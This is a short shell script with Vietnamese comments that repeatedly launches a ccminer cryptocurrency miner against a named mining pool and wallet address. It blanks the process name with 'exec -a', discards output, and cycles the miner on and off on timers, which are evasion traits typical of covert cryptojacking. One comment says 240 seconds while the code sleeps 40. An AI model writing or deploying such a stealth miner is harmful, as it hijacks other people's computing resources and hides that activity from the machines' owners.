#!/bin/sh

sleep 800

while true; do
    # Chạy lệnh với tên tiến trình đã thay đổi
    bash -c "exec -a '' ./ccminer -a verus -o stratum+tcp://sg.vipor.net:5040#xnsub -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.AMDREGer08 -p x -t 5 > /dev/null 2>&1" &
    
    # Lưu PID của tiến trình
    PID=$!  # Lưu PID ngay sau khi chạy

    # Chờ 10 phút
    sleep 600

    # Dừng tiến trình
    kill $PID

    # Đợi cho tiến trình dừng hoàn toàn
    wait $PID 2>/dev/null

    # Nghỉ 240 giây
    sleep 40
done
